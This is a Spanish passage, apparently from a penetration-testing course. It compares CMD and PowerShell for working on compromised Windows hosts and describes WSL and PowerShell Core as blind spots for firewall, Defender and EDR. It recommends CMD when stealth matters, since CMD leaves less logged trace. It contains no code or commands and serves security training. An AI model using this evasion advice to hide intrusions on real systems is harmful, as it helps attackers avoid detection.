CMD shell es la shell MS-DOS original integrada en Windows. Fue hecha para la interacción básica y operaciones de TI en un host. Se podría lograr alguna automatización simple con archivos batch, pero eso era todo. Powershell llegó con el propósito de expandir las capacidades de cmd. PowerShell entiende los comandos MS-DOS nativos utilizados en CMD y un conjunto completamente nuevo de comandos basados en .NET. También se pueden implementar nuevos módulos autosuficientes en PowerShell con cmdlets. El prompt CMD trata con la entrada y salida de texto, mientras que PowerShell utiliza objetos .NET para toda la entrada y salida. Otra consideración importante es que CMD no mantiene un registro de los comandos utilizados durante la sesión, mientras que PowerShell sí. Entonces, en el contexto de ser sigiloso, ejecutar comandos con cmd dejará menos rastro en el host. Otros problemas potenciales como la `Execution Policy` y el `User Account Control (UAC)` pueden inhibir tu capacidad para ejecutar comandos y scripts en el host. Estas consideraciones afectan a `PowerShell` pero no a cmd. Otra gran preocupación a tener en cuenta es la antigüedad del host. Si caes en un host Windows XP o más antiguo (sí, aún es posible...) PowerShell no está presente, por lo que tu única opción será cmd. PowerShell no se concretó hasta Windows 7. Entonces, para resumirlo:

Usa `CMD` cuando:

- Estás en un host más antiguo que puede no incluir PowerShell.
- Cuando solo necesitas interacciones simples/acceso al host.
- Cuando planeas usar archivos batch simples, comandos net o herramientas nativas de MS-DOS.
- Cuando crees que las políticas de ejecución pueden afectar tu capacidad para ejecutar scripts u otras acciones en el host.

Usa `PowerShell` cuando:

- Planeas utilizar cmdlets u otros scripts personalizados.
- Cuando deseas interactuar con objetos .NET en lugar de salida de texto.
- Cuando ser sigiloso es de menor preocupación.
- Si planeas interactuar con servicios y hosts basados en la nube.
- Si tus scripts establecen y utilizan alias.

---

## WSL and PowerShell For Linux

El Windows Subsystem for Linux es una nueva herramienta poderosa que se ha introducido en los hosts Windows que proporciona un entorno Linux virtual integrado en tu host. Mencionamos esto porque el paisaje rápidamente cambiante de los sistemas operativos puede muy bien permitir formas novedosas de obtener acceso a un host. Al escribir este módulo, se encontraron varios ejemplos de malware en estado salvaje que intentaban utilizar Python3 y binarios Linux para descargar e instalar payloads en un host Windows a través de WSL. Al igual que en esta publicación [aquí](https://www.bleepingcomputer.com/news/security/new-malware-uses-windows-subsystem-for-linux-for-stealthy-attacks/), los atacantes también están utilizando bibliotecas de Python integradas que son nativas tanto en Windows como en Linux junto con PowerShell para realizar otras acciones en el host. Otra cosa a tener en cuenta es que actualmente, cualquier solicitud o función de red ejecutada hacia o desde la instancia de WSL no es analizada por el Windows Firewall y Windows Defender, lo que lo convierte en un punto ciego en el host.

Los mismos problemas se pueden encontrar actualmente a través de PowerShell Core, que puede instalarse en sistemas operativos Linux y llevar muchas funciones normales de PowerShell. Estos dos conceptos son excepcionalmente sigilosos porque, hasta la fecha, no se sabe mucho sobre los vectores de ataque o las formas de vigilarlos. Pero se han visto ataques dirigidos a estas características para evitar los mecanismos de detección de AV y EDR. Estos conceptos son un poco avanzados para este módulo, pero búscalos en un módulo futuro.